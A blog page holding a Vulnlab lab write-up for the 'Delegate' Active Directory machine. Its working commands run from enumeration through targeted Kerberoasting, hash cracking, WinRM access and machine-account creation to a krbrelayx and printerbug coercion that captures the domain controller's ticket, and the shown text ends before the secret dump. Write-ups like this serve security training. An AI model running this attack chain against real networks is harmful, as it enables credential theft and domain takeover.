<!DOCTYPE html><html lang="en" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Delegate - Vulnlab | Regex-33's blog</title><meta name="author" content="Youssef Achtatal"><meta name="copyright" content="Youssef Achtatal"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="Delegate is another AD machine that focuses more on your knowledge of how to exploit user privileges and traverse through an AD environment. The bulk of this machine will be done through AD, harboring">
<meta property="og:type" content="article">
<meta property="og:title" content="Delegate - Vulnlab">
<meta property="og:url" content="https://regex-33.me/2024/06/30/delegate/index.html">
<meta property="og:site_name" content="Regex-33&#39;s blog">
<meta property="og:description" content="Delegate is another AD machine that focuses more on your knowledge of how to exploit user privileges and traverse through an AD environment. The bulk of this machine will be done through AD, harboring">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://regex-33.me/images/vulnlab/delegate-vl/delegate_slide.png">
<meta property="article:published_time" content="2024-06-30T17:16:36.000Z">
<meta property="article:modified_time" content="2024-09-12T12:36:57.548Z">
<meta property="article:author" content="Youssef Achtatal">
<meta property="article:tag" content="Vulnlab">
<meta property="article:tag" content="Windows">
<meta property="article:tag" content="Medium">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://regex-33.me/images/vulnlab/delegate-vl/delegate_slide.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://regex-33.me/2024/06/30/delegate/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar@0.1.16/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":false,"highlightHeightLimit":false},
  copy: {
    success: 'Copy Successful',
    error: 'Copy Error',
    noSupport: 'Browser Not Supported'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: 'days',
  dateSuffix: {
    just: 'Just now',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: {"chs_to_cht":"You have switched to Traditional Chinese","cht_to_chs":"You have switched to Simplified Chinese","day_to_night":"You have switched to Dark Mode","night_to_day":"You have switched to Light Mode","bgLight":"#49b1f5","bgDark":"#1f1f1f","position":"bottom-left"},
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
    buttonText: 'Load More'
  },
  isPhotoFigcaption: true,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'Delegate - Vulnlab',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2024-09-12 08:36:57'
}</script><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
        if (t === 'dark') activateDarkMode()
        else if (t === 'light') activateLightMode()
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">Loading...</div></div></div><script>(()=>{
  const $loadingBox = document.getElementById('loading-box')
  const $body = document.body
  const preloader = {
    endLoading: () => {
      $body.style.overflow = ''
      $loadingBox.classList.add('loaded')
    },
    initLoading: () => {
      $body.style.overflow = 'hidden'
      $loadingBox.classList.remove('loaded')
    }
  }

  preloader.initLoading()
  window.addEventListener('load',() => { preloader.endLoading() })

  if (false) {
    document.addEventListener('pjax:send', () => { preloader.initLoading() })
    document.addEventListener('pjax:complete', () => { preloader.endLoading() })
  }
})()</script><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/images/cyber.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">8</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">10</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">10</div></a><a href="//"><div class="headline">Articles</div><div class="length-num">8</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/categories/vulnlab/"><i class="fa-fw fas fa-folder-open"></i><span> VL-Writeups</span></a></div><div class="menus_item"><a class="site-page" href="/categories/research/"><i class="fa-fw fas fa-folder-open"></i><span> Research</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg fixed" id="page-header" style="background-image: url('/images/cyberpunk-red.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="Regex-33's blog"><span class="site-name">Regex-33's blog</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/categories/vulnlab/"><i class="fa-fw fas fa-folder-open"></i><span> VL-Writeups</span></a></div><div class="menus_item"><a class="site-page" href="/categories/research/"><i class="fa-fw fas fa-folder-open"></i><span> Research</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Delegate - Vulnlab</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2024-06-30T17:16:36.000Z" title="Created 2024-06-30 13:16:36">2024-06-30</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2024-09-12T12:36:57.548Z" title="Updated 2024-09-12 08:36:57">2024-09-12</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/writeups/">writeups</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/writeups/vulnlab/">vulnlab</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/writeups/vulnlab/windows/">windows</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/writeups/vulnlab/windows/medium/">medium</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="Delegate - Vulnlab"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>Delegate is another AD machine that focuses more on your knowledge of how to exploit user privileges and traverse through an AD environment. The bulk of this machine will be done through AD, harboring some exploits such as unconstrained delegation and GenericWrite privileges.</p>
<h1 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h1><p>Let’s start by doing our usual NMAP scans of the machine.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">└─$ sudo nmap 10.10.87.35</span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-30 00:50 EDT</span><br><span class="line">Nmap scan report for delegate.vl (10.10.87.35)</span><br><span class="line">Host is up (0.11s latency).</span><br><span class="line">Not shown: 988 filtered tcp ports (no-response)</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">53/tcp   open  domain</span><br><span class="line">88/tcp   open  kerberos-sec</span><br><span class="line">135/tcp  open  msrpc</span><br><span class="line">139/tcp  open  netbios-ssn</span><br><span class="line">389/tcp  open  ldap</span><br><span class="line">445/tcp  open  microsoft-ds</span><br><span class="line">464/tcp  open  kpasswd5</span><br><span class="line">593/tcp  open  http-rpc-epmap</span><br><span class="line">636/tcp  open  ldapssl</span><br><span class="line">3268/tcp open  globalcatLDAP</span><br><span class="line">3269/tcp open  globalcatLDAPssl</span><br><span class="line">3389/tcp open  ms-wbt-server</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 7.17 seconds</span><br></pre></td></tr></table></figure>

<p>As stated before in the introduction, this machine is strictly AD. This means we won’t need to enumerate any form of web server to gain access to a user list.</p>
<p>Let’s run crackmapexec against the IP address to get the DNS name of the machine. Since this machine as ports 53 and 88, we can assume that it is a DC.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">└─$ crackmapexec smb 10.10.87.35                                   </span><br><span class="line">SMB         10.10.87.35     445    DC1              [*] Windows Server 2022 Build 20348 x64 (name:DC1) (domain:delegate.vl) (signing:True) (SMBv1:False)</span><br></pre></td></tr></table></figure>

<p>We’ll add the DNS name <code>dc1.delegate.vl</code> and <code>delegate.vl</code> to our <code>/etc/hosts</code> file.</p>
<p>Let’s look at SMB to see if there are any files that are being hosted that we can exfil to our Kali machine.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">└─$ smbclient -L 10.10.87.35 -N          </span><br><span class="line"></span><br><span class="line">Sharename       Type      Comment</span><br><span class="line">---------       ----      -------</span><br><span class="line">ADMIN$          Disk      Remote Admin</span><br><span class="line">C$              Disk      Default share</span><br><span class="line">IPC$            IPC       Remote IPC</span><br><span class="line">NETLOGON        Disk      Logon server share </span><br><span class="line">SYSVOL          Disk      Logon server share</span><br></pre></td></tr></table></figure>

<p>Since we have null authentication enabled to SMB, we can enumerate the shares without needing credentials. While the default shares seem to be the only shares on this machine, let’s still see if there’s anything within <code>NETLOGON</code> or <code>SYSVOL</code>.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">smb: \delegate.vl\scripts\&gt; ls</span><br><span class="line">  .                                   D        0  Sat Aug 26 08:45:24 2023</span><br><span class="line">  ..                                  D        0  Sat Aug 26 05:45:45 2023</span><br><span class="line">  users.bat                           A      159  Sat Aug 26 08:54:29 2023</span><br><span class="line"></span><br><span class="line">5242879 blocks of size 4096. 1932408 blocks available</span><br><span class="line">smb: \delegate.vl\scripts\&gt; get users.bat</span><br><span class="line">getting file \delegate.vl\scripts\users.bat of size 159 as users.bat (0.4 KiloBytes/sec) (average 0.4 KiloBytes/sec)</span><br></pre></td></tr></table></figure>

<p>I found an interesting <code>users.bat</code> file in the startup script folder in <code>SYSVOL</code>. Let’s pull this down to our local machine to see if it contains any information.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">└─$ cat users.bat               </span><br><span class="line">rem @echo off</span><br><span class="line">net use * /delete /y</span><br><span class="line">net use v: \\dc1\development </span><br><span class="line"></span><br><span class="line">if %USERNAME%==A.Briggs net use h: \\fileserver\backups /user:Administrator [...snip...]</span><br></pre></td></tr></table></figure>

<p>As you can see from the above, it seems as though we have a user that is accessing a share in their startup script and accessing the backup share in the fileserver as an Administrator.</p>
<p>Assuming that this password is associated with this user, let’s run crackmapexec to see if their password is a match.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">└─$ crackmapexec smb 10.10.87.35 -u &#x27;A.Briggs&#x27; -p &#x27;[...snip...]&#x27;</span><br><span class="line">SMB         10.10.87.35     445    DC1              [*] Windows Server 2022 Build 20348 x64 (name:DC1) (domain:delegate.vl) (signing:True) (SMBv1:False)</span><br><span class="line">SMB         10.10.87.35     445    DC1              [+] delegate.vl\A.Briggs:[...snip...]</span><br><span class="line"></span><br><span class="line">└─$ crackmapexec ldap 10.10.87.35 -u &#x27;A.Briggs&#x27; -p &#x27;[...snip...]&#x27;</span><br><span class="line">SMB         10.10.87.35     445    DC1              [*] Windows Server 2022 Build 20348 x64 (name:DC1) (domain:delegate.vl) (signing:True) (SMBv1:False)</span><br><span class="line">LDAP        10.10.87.35     389    DC1              [+] delegate.vl\A.Briggs:[...snip...]</span><br></pre></td></tr></table></figure>

<p>It seems as though this is a valid domain user, who has access to both LDAP and SMB. Since we have access to LDAP, we can dump the domain as this user to view all of the domain objects. Let’s use Bloodhound with the <a target="_blank" rel="noopener" href="https://github.com/dirkjanm/BloodHound.py">Python ingestor</a> to do this.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">└─$ bloodhound-python -d &#x27;delegate.vl&#x27; -u &#x27;A.Briggs&#x27; -p &#x27;(A.BRIGGS PASSWORD)&#x27; -c all -ns 10.10.87.35 --zip</span><br></pre></td></tr></table></figure>

<p>This should return a compressed archive containing all of the domain objects within the AD environment. We’ll start up <code>neo4j</code> along with the <code>Bloodhound</code> GUI in order to view this in a graph.</p>
<h1 id="GenericWrite-over-N-Thompson"><a href="#GenericWrite-over-N-Thompson" class="headerlink" title="GenericWrite over N.Thompson"></a>GenericWrite over N.Thompson</h1><p>I did some initial enumeration of the domain objects, specifically the node for <code>A.Briggs</code> and what they have access to. It seems they have an interesting outbound object control on another node.</p>
<p><img src="/images/vulnlab/delegate-vl/b.png"></p>
<p>From the screenshot above, it seems as though we have GenericWrite over the user <code>N.Thompson</code>.</p>
<p>This is much different than what we know about having GenericWrite or GenericAll on a node in the past. For some of my other writeups, we often had these privileges on a domain computer. The process for exploiting this against a domain user is much different - though it is simpler in my opinion.</p>
<p>If we have GenericWrite over a domain user object, there is a Kerberos exploit we could do. We could perform <a target="_blank" rel="noopener" href="https://github.com/ShutdownRepo/targetedKerberoast">targeted Kerberoasting</a> on the domain object to request a TGS on behalf of them. This TGT will be encrypted with their password, which we can attempt to crack offline.</p>
<p>You can do this with the GitHub repository provided above. An example command can be found below.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">└─$ python3 targetedKerberoast.py -d &#x27;delegate.vl&#x27; -u &#x27;A.Briggs&#x27; -p &#x27;(A.BRIGGS PASSWORD)&#x27; --request-user &#x27;N.Thompson&#x27;</span><br><span class="line">[*] Starting kerberoast attacks</span><br><span class="line">[*] Attacking user (N.Thompson)</span><br><span class="line">[+] Printing hash for (N.Thompson)</span><br><span class="line">$krb5tgs$23$*N.Thompson$DELEGATE.VL$delegate.vl/N.Thompson*$99c33fd94eb13970a6963667b7589c0a$29314c913d36f[...snip...]88b9ec9b2f6cd7e7f190edb308d9f</span><br></pre></td></tr></table></figure>

<p>As you can see, this returned a valid TGS for the <code>N.Thompson</code> user. I did not need to update any of the dependencies needed for this, though it may be different for you.</p>
<p>Let’s now use <a target="_blank" rel="noopener" href="https://hashcat.net/wiki/doku.php?id=example_hashes">hashcat</a> with a hash-identifier of 13100 to attempt to decrypt this hash.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">└─$ hashcat -a 0 -m 13100 nthompson.txt /usr/share/wordlists/rockyou.txt</span><br><span class="line">......</span><br><span class="line">f81d26ea14e743da90803146fc62ee86195ff78c872e0422bfb05fcb74c9ec6337b612aaa6338382da5ee166bffe0d275685ab7388b9ec9b2f6cd7e7f190edb308d9f:[...snip...]</span><br><span class="line"></span><br><span class="line">Session..........: hashcat</span><br><span class="line">Status...........: Cracked</span><br></pre></td></tr></table></figure>

<p>As you can see from the above, the password was cracked successfully. We can now use this with crackmapexec to see if <code>N.Thompson</code> has any valid authentication to any other resources.</p>
<p><img src="/images/vulnlab/delegate-vl/c.png"></p>
<p>It seems as though <code>N.Thompson</code> is a part of the <code>Remote Management Users</code> group. From my first guess, this means that they can PSRemote into the machine (meaning they have RDP access).</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">└─$ crackmapexec winrm 10.10.87.35 -u &#x27;N.Thompson&#x27; -p &#x27;[...snip...]&#x27;</span><br><span class="line">SMB         10.10.87.35     5985   DC1              [*] Windows Server 2022 Build 20348 (name:DC1) (domain:delegate.vl)</span><br><span class="line">HTTP        10.10.87.35     5985   DC1              [*] http://10.10.87.35:5985/wsman</span><br><span class="line">WINRM       10.10.87.35     5985   DC1              [+] delegate.vl\N.Thompson:[...snip...] (Pwn3d!)</span><br></pre></td></tr></table></figure>

<p>It seems as though we have the ability to WinRM into the machine. Let’s do so with <code>evil-winrm</code>.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">└─$ evil-winrm --ip 10.10.87.35 -u &#x27;N.Thompson&#x27; -p &#x27;(N.THOMPSON PASSWORD)&#x27;</span><br><span class="line"></span><br><span class="line">Evil-WinRM shell v3.5</span><br><span class="line"></span><br><span class="line">Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine               </span><br><span class="line">Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion</span><br><span class="line"></span><br><span class="line">Info: Establishing connection to remote endpoint</span><br><span class="line">*Evil-WinRM* PS C:\Users\N.Thompson\Documents&gt; whoami</span><br><span class="line">delegate\n.thompson</span><br><span class="line">*Evil-WinRM* PS C:\Users\N.Thompson\Documents&gt; hostname</span><br><span class="line">DC1</span><br></pre></td></tr></table></figure>

<p>The first user flag is within their home directory, denoted path as <code>C:\Users\N.Thompson\Desktop\user.txt</code>.</p>
<h1 id="SeEnableDelegationPrivilege-and-MAQs"><a href="#SeEnableDelegationPrivilege-and-MAQs" class="headerlink" title="SeEnableDelegationPrivilege and MAQs"></a>SeEnableDelegationPrivilege and MAQs</h1><p>I decided not to use Sliver for this, as it really isn’t needed aside from transferring files to the machine easily. We’ll be doing the rest of this solely from the WinRM session that we have.</p>
<p>If you run <code>whoami /priv</code>, you’ll notice an interesting privilege that has been enabled for <code>N.Thompson</code>.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Users\N.Thompson\Documents&gt; whoami /priv</span><br><span class="line"></span><br><span class="line">PRIVILEGES INFORMATION</span><br><span class="line">----------------------</span><br><span class="line"></span><br><span class="line">Privilege Name                Description                                                    State</span><br><span class="line">============================= ============================================================== =======</span><br><span class="line">SeMachineAccountPrivilege     Add workstations to domain                                     Enabled</span><br><span class="line">SeChangeNotifyPrivilege       Bypass traverse checking                                       Enabled</span><br><span class="line">SeEnableDelegationPrivilege   Enable computer and user accounts to be trusted for delegation Enabled</span><br><span class="line">SeIncreaseWorkingSetPrivilege Increase a process working set                                 Enabled</span><br></pre></td></tr></table></figure>

<p>It seems as though they have <code>SeEnableDelegationPrivilege</code>, which is a new privilege that I have not encountered before. This specific privilege allows us to enable the trusted asset for computer and user accounts.</p>
<p>You can find documentation on this privilege <a target="_blank" rel="noopener" href="https://www.elastic.co/guide/en/security/current/sensitive-privilege-seenabledelegationprivilege-assigned-to-a-user.html">here</a>. Essentially, this privilege allows our user to impersonate other accounts or computers. The interesting thing about this privilege is that we can essentially set delegation properties to be configured on behalf of user and computer objects, hence the ability for us to <code>Enable</code> delegation.</p>
<p>Another interesting part about this is the fact that we can do this for computer accounts as well. While we don’t have access to any machine accounts currently, our current user does have a property that isn’t normally enabled to user accounts. That specific property is our MAQ, or <code>MachineAccountQuota</code>. This specific property allows us to create computer accounts within the context of our current users permissions.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">└─$ crackmapexec ldap 10.10.87.35 -u &#x27;N.Thompson&#x27; -p &#x27;[...snip...]&#x27; -M maq</span><br><span class="line">SMB         10.10.87.35     445    DC1              [*] Windows Server 2022 Build 20348 x64 (name:DC1) (domain:delegate.vl) (signing:True) (SMBv1:False)</span><br><span class="line">LDAP        10.10.87.35     389    DC1              [+] delegate.vl\N.Thompson:[...snip...]</span><br><span class="line">MAQ         10.10.87.35     389    DC1              [*] Getting the MachineAccountQuota</span><br><span class="line">MAQ         10.10.87.35     389    DC1              MachineAccountQuota: 10</span><br></pre></td></tr></table></figure>

<p>As you can see, it seems as though <code>N.Thompson</code> has a MAQ of 10. In order to add computer accounts to the domain, a minimum MAQ of 1 is required.</p>
<h1 id="Exploiting-Unconstrained-Delegation"><a href="#Exploiting-Unconstrained-Delegation" class="headerlink" title="Exploiting Unconstrained Delegation"></a>Exploiting Unconstrained Delegation</h1><p>At this point, the attack path becomes relatively clear. What we’ll need to do is perform <a target="_blank" rel="noopener" href="https://dirkjanm.io/krbrelayx-unconstrained-delegation-abuse-toolkit/">Unconstrained Delegation</a>:</p>
<ul>
<li>Create a computer account and add its DNS entry to <code>EXAMPLE.delegate.vl</code> to point to our attacker machine.</li>
<li>Use <code>krbrelayx</code> to listen for incoming Kerberos keys and cache them accordingly.</li>
<li>Coerce an authentication attempt from the DC and capture the authentication request with <code>krbrelayx</code>. (We can use <code>printerbug</code> for this)</li>
<li>Use the captured DC service ticket to dump the domain secrets.</li>
</ul>
<p>I found reference on how to do this locally from our Kali machine <a target="_blank" rel="noopener" href="https://www.thehacker.recipes/ad/movement/kerberos/delegations/unconstrained">here</a>. While I had given it a try to use <code>addcomputer</code> in Impacket’s library to do this, the issue is that it does not add the sufficient SPNs that you need on the machine account to perform unconstrained delegation. The only SPN that you have the ability to add with <code>addcomputer</code> is <code>HTTP/(account).delegate.vl</code>.</p>
<p>The list of the required SPNs is below. I used <a target="_blank" rel="noopener" href="https://github.com/Kevin-Robertson/Powermad">Powermad</a> to get the specific attributes of a machine account I had configured.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HTTP/dazzad.delegate.vl</span><br><span class="line">RestrictedKrbHost/dazzad</span><br><span class="line">HOST/dazzad</span><br><span class="line">RestrictedKrbHost/dazzad.delegate.vl</span><br><span class="line">HOST/dazzad.delegate.vl</span><br></pre></td></tr></table></figure>

<p>Luckily enough, when you add a machine account via Powermad, it should add these SPNs for you. There is also an additional SPN identifier that we’ll need to have to ensure that the delegation rights are set correctly on the account.</p>
<p>Let’s first start by creating the computer account through WinRM.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Users\N.Thompson\Documents&gt; New-MachineAccount -MachineAccount dazzad -Password $(ConvertTo-SecureString &#x27;DazPassword123@&#x27; -AsPlainText -Force)</span><br></pre></td></tr></table></figure>

<p>Next, we’ll add the SPNs to the machine account so that it can properly exploit the delegation.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Users\N.Thompson\Documents&gt; Set-MachineAccountAttribute -MachineAccount dazzad -Attribute ServicePrincipalName -Value HTTP/dazzad.delegate.vl -Append</span><br><span class="line">[+] Machine account dazzad attribute ServicePrincipalName appended</span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\N.Thompson\Documents&gt; Set-MachineAccountAttribute -MachineAccount dazzad -Attribute userAccountControl -Value 528384</span><br><span class="line">[+] Machine account daz attribute userAccountControl updated</span><br></pre></td></tr></table></figure>

<p>We can verify our changes to the machine account by running <code>Get-MachineAccountAttribute</code> against the machine account we created.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Users\N.Thompson\Documents&gt; Get-MachineAccountAttribute -MachineAccount dazzad -Attribute ServicePrincipalName -Verbose</span><br><span class="line">Verbose: [+] Domain Controller = DC1.delegate.vl</span><br><span class="line">Verbose: [+] Domain = delegate.vl</span><br><span class="line">Verbose: [+] Distinguished Name = CN=dazzad,CN=Computers,DC=delegate,DC=vl</span><br><span class="line">HTTP/dazzad.delegate.vl</span><br><span class="line">RestrictedKrbHost/dazzad</span><br><span class="line">HOST/dazzad</span><br><span class="line">RestrictedKrbHost/dazzad.delegate.vl</span><br><span class="line">HOST/dazzad.delegate.vl</span><br></pre></td></tr></table></figure>

<p>Now that we have the respective SPNs set for this exploit, we can move back to our Kali machine for the rest of the exploit.</p>
<p>We’ll need to add the LDAP record to <code>delegate.vl</code> to ensure that when we force it to authenticate to our machine account, it will redirect back to our MITM <code>krbrelayx</code> handler.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">└─$ python3 krbrelayx/dnstool.py -u &#x27;delegate.vl\dazzad$&#x27; -p &#x27;DazPassword123@&#x27; -r DAZZAD.delegate.vl -d (KALI IP) --action add -dns-ip 10.10.92.191 dc1.delegate.vl                        </span><br><span class="line">[-] Connecting to host...</span><br><span class="line">[-] Binding to host</span><br><span class="line">[+] Bind OK</span><br><span class="line">[-] Adding new record</span><br><span class="line">[+] LDAP operation completed successfully</span><br></pre></td></tr></table></figure>

<p>Now that all of that is set, we can start our <code>krbrelayx</code> listener to listen for incoming requests.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">└─$ python3 krbrelayx/krbrelayx.py --krbsalt &#x27;DELEGATE\DAZ$&#x27; --krbpass &#x27;DazPassword123@&#x27;</span><br></pre></td></tr></table></figure>

<p>We’ll then use <code>printerbug</code> to exploit the authentication coercion. This should force the DC to authenticate to our machine account, meaning the Kerberos TGT used to access our fake machine will be cached during the authentication exchange.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">└─$ python3 krbrelayx/printerbug.py delegate.vl/&#x27;DAZ$&#x27;:&#x27;DazPassword123@&#x27;@dc1.delegate.vl DAZZAD.delegate.vl</span><br><span class="line">[*] Impacket v0.12.0.dev1 - Copyright 2023 Fortra</span><br><span class="line"></span><br><span class="line">[*] Attempting to trigger authentication via rprn RPC at dc1.delegate.vl</span><br><span class="line">[*] Bind OK</span><br><span class="line">[*] Got handle</span><br><span class="line">DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied </span><br><span class="line">[*] Triggered RPC backconnect, this may or may not have worked</span><br></pre></td></tr></table></figure>

<p>While we do get an <code>access_denied</code> error, if you look back at our <code>krbrelayx</code> listener - it should have received the authentication attempt and cached the DC’s service ticket in a <code>.ccache</code> file.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[*] Setting up DNS Server</span><br><span class="line">[*] Servers started, waiting for connections</span><br><span class="line">[*] SMBD: Received connection from 10.10.92.191</span><br><span class="line">[*] Got ticket for DC1$@DELEGATE.VL [krbtgt@DELEGATE.VL]</span><br><span class="line">[*] Saving ticket in DC1$@DELEGATE.VL_krbtgt@DELEGATE.VL.ccache</span><br></pre></td></tr></table></figure>

<p>Now that we have the service ticket for the DC, we can import this into our Kerberos authentication global variable to dump the respective secrets. I opted to rename the ticket file just so that the special characters don’t interfere with the global variable’s interpretation of the file.</p>
